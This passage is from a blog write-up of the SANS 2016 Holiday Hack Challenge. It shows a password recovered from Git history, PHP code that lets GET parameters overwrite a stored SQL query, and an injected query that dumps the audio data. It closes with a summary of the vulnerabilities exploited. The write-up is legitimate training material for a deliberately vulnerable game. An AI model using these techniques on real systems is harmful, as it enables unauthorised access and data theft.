  &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt; &lt;span class="nb"&gt;varchar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;NOT&lt;/span&gt; &lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt; &lt;span class="nb"&gt;varchar&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;NOT&lt;/span&gt; &lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="k"&gt;PRIMARY&lt;/span&gt; &lt;span class="k"&gt;KEY&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;`&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;ENGINE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;InnoDB&lt;/span&gt; &lt;span class="k"&gt;DEFAULT&lt;/span&gt; &lt;span class="n"&gt;CHARSET&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;latin1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cm"&gt;/*!40101 SET character_set_client = @saved_cs_client */&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But, if we take a look at the Git log, we can see that the file was &amp;quot;fixed&amp;quot;:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
commit 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
Author: me &amp;lt;me&amp;#64;example.org&amp;gt;
Date:   Mon Nov 21 21:15:08 2016 -0800

    Fix database dump
&lt;/pre&gt;
&lt;p&gt;Let's see the different modifications made on &lt;code&gt;sprusage.sql&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;git log -p -- ./sprusage.sql
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
commit 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
Author: me &amp;lt;me@example.org&amp;gt;
Date:   Mon Nov &lt;span class="m"&gt;21&lt;/span&gt; 21:15:08 &lt;span class="m"&gt;2016&lt;/span&gt; -0800

    Fix database dump

diff --git a/sprusage.sql b/sprusage.sql
index a382229..b948dd0 100644
--- a/sprusage.sql
+++ b/sprusage.sql
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
 LOCK TABLES &lt;span class="sb"&gt;`&lt;/span&gt;users&lt;span class="sb"&gt;`&lt;/span&gt; WRITE&lt;span class="p"&gt;;&lt;/span&gt;
 /*!40000 ALTER TABLE &lt;span class="sb"&gt;`&lt;/span&gt;users&lt;span class="sb"&gt;`&lt;/span&gt; DISABLE KEYS */&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="hll"&gt;-INSERT INTO &lt;span class="sb"&gt;`&lt;/span&gt;users&lt;span class="sb"&gt;`&lt;/span&gt; VALUES &lt;span class="o"&gt;(&lt;/span&gt;0,&lt;span class="s1"&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;,&lt;span class="s1"&gt;&amp;#39;KeepWatchingTheSkies&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="o"&gt;(&lt;/span&gt;1,&lt;span class="s1"&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;,&lt;span class="s1"&gt;&amp;#39;busyllama67&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt; /*!40000 ALTER TABLE &lt;span class="sb"&gt;`&lt;/span&gt;users&lt;span class="sb"&gt;`&lt;/span&gt; ENABLE KEYS */&lt;span class="p"&gt;;&lt;/span&gt;
 UNLOCK TABLES&lt;span class="p"&gt;;&lt;/span&gt;
 /*!40103 SET &lt;span class="nv"&gt;TIME_ZONE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;@OLD_TIME_ZONE */&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that &lt;code&gt;administrator&lt;/code&gt;'s password is
&lt;code&gt;KeepWatchingTheSkies&lt;/code&gt;. With these credentials, we have another method
of authenticating as &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Anyway, we now have access to the &lt;code&gt;edit.php&lt;/code&gt; page. This means that we can
edit past saved queries. However, we can only modify the name or the
description of the query, as shown on the screenshot above. Let's see this
functionality in action:&lt;/p&gt;
&lt;img alt="analytics_edit_first_use.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_edit_first_use.png" /&gt;
&lt;p&gt;Hmm, we can see that the page checks for the presence of some parameters:
&lt;code&gt;name&lt;/code&gt;, &lt;code&gt;description&lt;/code&gt;... and &lt;code&gt;query&lt;/code&gt;! Let's take a look at
the &lt;code&gt;edit.php&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;else&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mysqli_query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT * FROM `reports` WHERE `id`=&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;mysqli_real_escape_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;#39; LIMIT 0, 1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nv"&gt;$result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;reply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MySQL Error: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;mysqli_error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
      &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$row&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mysqli_fetch_assoc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;
    &lt;span class="c1"&gt;# Update the row with the new values&lt;/span&gt;
    &lt;span class="nv"&gt;$set&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$row&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;      &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Checking for &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;htmlentities&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;...&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Yup!&amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$set&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;`&lt;/span&gt;&lt;span class="si"&gt;$name&lt;/span&gt;&lt;span class="s2"&gt;`=&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;mysqli_real_escape_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the &lt;code&gt;edit.php&lt;/code&gt; page checks for the presence of every
columns of the &lt;code&gt;reports&lt;/code&gt; table in the &lt;code&gt;GET&lt;/code&gt; parameters. This means
that if we specify a &lt;code&gt;query&lt;/code&gt; &lt;code&gt;GET&lt;/code&gt; parameter, we can modify the
stored SQL query of a specific request!&lt;/p&gt;
&lt;p&gt;By looking the SQL schema file, &lt;code&gt;sprusage.sql&lt;/code&gt;, we can see the format
of the &lt;code&gt;audio&lt;/code&gt; table, containing the coveted audio file. We can now
create our fake query:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;HEX&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mp3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;audio&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can now store our malevolent query, and execute it:&lt;/p&gt;
&lt;img alt="analytics_edit_exploit.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_edit_exploit.png" /&gt;
&lt;img alt="analytics_edit_exploit_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_edit_exploit_result.png" /&gt;
&lt;p&gt;We can now recover our hex-encoded audio file, decode it, and get the last
audio file, &lt;code&gt;discombobulatedaudio7.mp3&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="part-5-discombobulated-audio"&gt;
&lt;h2&gt;Part 5: Discombobulated Audio&lt;/h2&gt;
&lt;p&gt;Now that we've hacked the SantaGram infrastructure, we have our weird audio
files. You can download them here:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio1.mp3"&gt;discombobulatedaudio1.mp3&lt;/a&gt; (sha256: &lt;code&gt;8e759e28702e15720ff357694b1f8c9062680da933df5c9bdd16897bfcd00f01&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio2.mp3"&gt;discombobulatedaudio2.mp3&lt;/a&gt; (sha256: &lt;code&gt;e0050656c5262116f82cbe82c85d0b91f9003f22568bee7f4ce7987744c34f99&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio3.mp3"&gt;discombobulatedaudio3.mp3&lt;/a&gt; (sha256: &lt;code&gt;7c4a50771764b97227d27aa9dd0a99f396982882111a4924c0b51ee625251ac7&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/debug-20161224235959-0.mp3"&gt;debug-20161224235959-0.mp3&lt;/a&gt; (sha256: &lt;code&gt;35f5578bc12f096f4072e1dde2688b15145ba59bc48e9cb405576247c7e5a8bb&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio5.mp3"&gt;discombobulatedaudio5.mp3&lt;/a&gt; (sha256: &lt;code&gt;c088b01e3accc21eda910f25755ebe2ccda3959e4810ce76cdd8cde8ff07651e&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulated-audio-6-XyzE3N9YqKNH.mp3"&gt;discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/a&gt; (sha256: &lt;code&gt;776b26a58310d9ad80ab7b5c80fe4a5e03ed86210d9e28906fb93e30004ef35a&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio7.mp3"&gt;discombobulatedaudio7.mp3&lt;/a&gt; (sha256: &lt;code&gt;60259f117d76535518dc2b3f01ae314f0969d61ae7066e75af708be7b059f214&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;At first, I suspected that, since all the files are approximately the same
length, you had to superimpose every one of them, or something, which led
to this horrendous result:&lt;/p&gt;
&lt;audio src="/docs/sans-christmas-challenge-2016/horrendous_audio_file.ogg" controls&gt;&lt;/audio&gt;&lt;p&gt;You can download the audio file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/horrendous_audio_file.ogg"&gt;here&lt;/a&gt; (sha256: &lt;code&gt;c195d43e6445c84686a1bd4e89429db0f2802e8d8ae31e93769490d1204e098c&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;The solution is actually quite simpler. You just have to put the audio files
in the order we found them, then change the tempo of the audio track, to get
something intelligible:&lt;/p&gt;
&lt;audio src="/docs/sans-christmas-challenge-2016/de_discombobulated_audio.ogg" controls&gt;&lt;/audio&gt;&lt;p&gt;You can download the audio file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/de_discombobulated_audio.ogg"&gt;here&lt;/a&gt; (sha256: &lt;code&gt;20e91d466c4cea4e1282e32dfc52725eadff05276d91bcc9fbd547c09bf2964a&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;If you can't quite hear the spoken phrase, it's:&lt;/p&gt;
&lt;blockquote&gt;
Father Christmas, Santa Claus or, as I've always known him, Jeff.&lt;/blockquote&gt;
&lt;p&gt;Now, I didn't recognize the reference right away, but if you
&lt;a class="reference external" href="https://duckduckgo.com/?q=%22Father+Christmas%2C+Santa+Claus+or%2C+as+I%27ve+always+known+him%2C+Jeff.%22&amp;amp;ia=web"&gt;DuckDuckgo the sentence&lt;/a&gt;
(or part of it if you only got some audio files), you find that it's from a
Doctor Who Christmas Special, &lt;a class="reference external" href="http://www.imdb.com/title/tt1672218/"&gt;A Christmas Carol&lt;/a&gt;.
Now, I DID see this Doctor Who, but failed to remember the reference, so I'm
still ashamed of this.&lt;/p&gt;
&lt;p&gt;Anyway, if you remember, there was still one door in the North Pole we couldn't
open: the door in the Corridor. Since the audio pointed to Doctor Who, I tried
every element of the show I could think of (&amp;quot;The Doctor&amp;quot;, &amp;quot;Amy Pond&amp;quot;, &amp;quot;The
Master&amp;quot;, &amp;quot;Tardis&amp;quot;, &amp;quot;tardis&amp;quot;, &amp;quot;TARDIS&amp;quot;, &amp;quot;Geronimo&amp;quot;, &amp;quot;Geronimo!&amp;quot;, &amp;quot;Geronimo!!!&amp;quot;,
...). Turns out, the passphrase to the door was just the full sentence we
hear in the audio file. Trying too hard leads nowhere.&lt;/p&gt;
&lt;p&gt;Now that we've opened the door, we can see Who is behind this nefarious plot
(see what I did there?).&lt;/p&gt;
&lt;img alt="the_doctor.png" class="align-center" src="/images/sans-christmas-challenge-2016/the_doctor.png" /&gt;
&lt;p&gt;It was the Doctor all along! If we talk to him, he explains his plan:&lt;/p&gt;
&lt;blockquote&gt;
The question of the hour is this: Who nabbed Santa. The answer? Yes,
I did. Next question: Why would anyone in his right mind kidnap Santa
Claus? The answer: Do I look like I'm in my right mind? I'm a madman
with a box. I have looked into the time vortex and I have seen a
universe in which the Star Wars Holiday Special was NEVER released.
In that universe, 1978 came and went as normal. No one had to endure
the misery of watching that abominable blight. People were happy
there. It's a better life, I tell you, a better world than the
scarred one we endure here. Give me a world like that. Just once. So
I did what I had to do. I knew that Santa's powerful North Pole
Wonderland Magick could prevent the Star Wars Special from being
released, if I could leverage that magick with my own abilities back
in 1978. But Jeff refused to come with me, insisting on the mad idea
that it is better to maintain the integrity of the universe’s
timeline. So I had no choice – I had to kidnap him. It was sort
of one of those days. Well. You know what I mean. Anyway... Since you
interfered with my plan, we'll have to live with the Star Wars
Holiday Special in this universe... FOREVER.  If we attempt to go
back again, to cross our own timeline, we'll cause a temporal
paradox, a wound in time. We'll never be rid of it now. The Star Wars
Holiday Special will plague this world until time itself ends... All
because you foiled my brilliant plan.  Nice work.&lt;/blockquote&gt;
&lt;p&gt;Now, although I'm a major Star Wars fan, I've always decided to listen to the
advice of my elders regarding the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Star_Wars_Holiday_Special"&gt;Christmas Special&lt;/a&gt;
(shout out to &lt;a class="reference external" href="https://xkcd.com/653/"&gt;Randal Munroe&lt;/a&gt;), and I've never
watched it. Guess I'll continue to refrain from watching it. Brrrr...&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="epilogue-bringing-it-all-home"&gt;
&lt;h2&gt;Epilogue: Bringing It All Home&lt;/h2&gt;
&lt;p&gt;As the title suggests, it's time to bring it home, and answer each question of
the challenge:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;&lt;cite&gt;What is the secret message in Santa's tweets?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The secret message in Santa's tweets is &lt;code&gt;bugbounty&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;&lt;cite&gt;What is inside the ZIP file distributed by Santa's team?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Inside the ZIP file distributed by Santa's team, there is a copy of the Android
application for their bug bounty, SantaGram_4.2.apk.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;&lt;cite&gt;What username and password are embedded in the APK file?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The credentials in the APK file are &lt;code&gt;guest/busyreindeer78&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;&lt;cite&gt;What is the name of the audible component (audio file. in the SantaGram APK
file?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The name of the audio file in the SantaGram APK file is
&lt;code&gt;discombobulatedaudio1.mp3&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;&lt;cite&gt;What is the password for the &amp;quot;cranpi&amp;quot; account on the Cranberry Pi system?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The password of the &amp;quot;cranpi&amp;quot; account is &lt;code&gt;yummycookies&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="6"&gt;
&lt;li&gt;&lt;cite&gt;How did you open each terminal door and where had the villain imprisoned
Santa?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;Elf House #2&lt;/strong&gt;: using &lt;code&gt;sudo&lt;/code&gt; to execute commands as &lt;code&gt;itchy&lt;/code&gt;, we
can read the PCAP file, containing the two halves of the passphrase, one
encoded in plain 7-bit ASCII, one encoded in 16-bit big endian.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Workshop, first door&lt;/strong&gt;: using &lt;code&gt;find&lt;/code&gt;, we can find the file containing
the passphrase, and print its content.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Santa's office&lt;/strong&gt;: using our &lt;cite&gt;*cough cough*&lt;/cite&gt; knowledge of the film WarGames,
we can get the correct passphrase.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Workshop, second door&lt;/strong&gt;: by analyzing the &lt;code&gt;wumpus&lt;/code&gt; program, we can
find the function in charge of computing the passphrase, and directly call
it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Train station&lt;/strong&gt;: since the &lt;code&gt;HELP&lt;/code&gt; function uses &lt;code&gt;less&lt;/code&gt; to print
the content of the help file, we can use &lt;code&gt;less&lt;/code&gt;'s features to open
other files, including the one containing the passphrase.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The villain had imprisoned Santa Claus in the DFER room, &lt;strong&gt;in 1978&lt;/strong&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;&lt;cite&gt;For each of those six items, which vulnerabilities did you discover and
exploit?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Mobile Analytics Server (via credentialed login access)&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;Credentials stored in plaintext in the SantaGram APK.&lt;/li&gt;
&lt;li&gt;Use of these credentials on the analytics server.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Dungeon Game&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;Finding of the Dungeon CLI with &lt;code&gt;nmap&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Using our &lt;cite&gt;*cough cough*&lt;/cite&gt; knowledge of the video game Zork to get the
email address of Peppermint.&lt;/li&gt;
&lt;li&gt;Sending an email to Peppermint to receive the audio file.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Debug Server&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;Patching of the SantaGram APK to enable debug data.&lt;/li&gt;
&lt;li&gt;JSON request tampering to increase verbosity of the debug server.&lt;/li&gt;
&lt;li&gt;Disclosing of the path of the audio file in the response of the debug
server.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Banner Ad Server&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;Using Meteor Miner, we could list the different routes.&lt;/li&gt;
&lt;li&gt;Disclosing of the &lt;code&gt;/admin/quotes&lt;/code&gt; route.&lt;/li&gt;
&lt;li&gt;Using Meteor Miner, we could list the collection of quotes.&lt;/li&gt;
&lt;li&gt;Disclosing of the path of the audio file in the attributes of one of the
quotes.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Uncaught Exception Handler Server&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;Verbose error allowing to build a correct &lt;code&gt;ReadCrashDump&lt;/code&gt; request.&lt;/li&gt;
&lt;li&gt;Local File Inclusion in the &lt;code&gt;exception.php&lt;/code&gt; page.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;The Mobile Analytics Server (post authentication)&lt;/strong&gt;:&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;Source files recovery with open Git repository.&lt;/li&gt;
&lt;li&gt;Creation of an administrator cookie.&lt;/li&gt;
&lt;li&gt;Exploitation of the &lt;code&gt;edit.php&lt;/code&gt; page to store an arbitrary SQL
query.&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="8"&gt;
&lt;li&gt;&lt;cite&gt;What are the names of the audio files you discovered from each system above?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;The Mobile Analytics Server (via credentialed login access)&lt;/strong&gt;: &lt;code&gt;discombobulatedaudio2.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Dungeon Game&lt;/strong&gt;: &lt;code&gt;discombobulatedaudio3.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Debug Server&lt;/strong&gt;: &lt;code&gt;debug-20161224235959-0.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Banner Ad Server&lt;/strong&gt;: &lt;code&gt;discombobulatedaudio5.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Uncaught Exception Handler Server&lt;/strong&gt;: &lt;code&gt;discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Mobile Analytics Server (post authentication)&lt;/strong&gt;: &lt;code&gt;discombobulatedaudio7.mp3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="9"&gt;
&lt;li&gt;&lt;cite&gt;Who is the villain behind the nefarious plot?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The villain behind the nefarious plot is the Doctor.&lt;/p&gt;
&lt;ol class="arabic simple" start="10"&gt;
&lt;li&gt;&lt;cite&gt;Why had the villain abducted Santa?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The Doctor had abducted Santa to use his magick to prevent the Star Wars
Christmas special from ever coming out.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Once again, a great challenge by the SANS, which I managed, this time, to
finish completely! I also noticed that I didn't improve my skills in reverse
engineering and binary analysis, which is a skill I wanted to improve, as said
